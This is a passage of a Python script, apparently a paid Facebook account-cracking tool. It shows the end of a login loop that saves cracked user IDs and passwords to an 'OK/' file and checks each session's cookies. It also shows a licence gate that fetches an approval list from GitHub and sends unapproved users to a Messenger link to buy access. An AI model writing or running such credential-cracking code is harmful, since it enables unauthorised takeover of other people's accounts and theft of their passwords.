				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass
	
def apvdef():
    a=str(os.geteuid())
    b=str(os.getlogin())
    yx="".join(a+b)
    y=yx.upper()
    key=f"S{y}C"
    row=httpx.get("https://github.com/SOHEL-VAU/Approval-1/blob/main/room.txt").text
    if key in row:
        login()
    else:
        os.system("clear")
        banner()
        print((" First Get Permission To Use"))
        print("Your Key : "+key)
        print("(Message me for Buy:)")
        
        os.system("xdg-open https://m.me/j/AbbU35lrYZPG7jaA/")
        sys.exit()

apvdef()
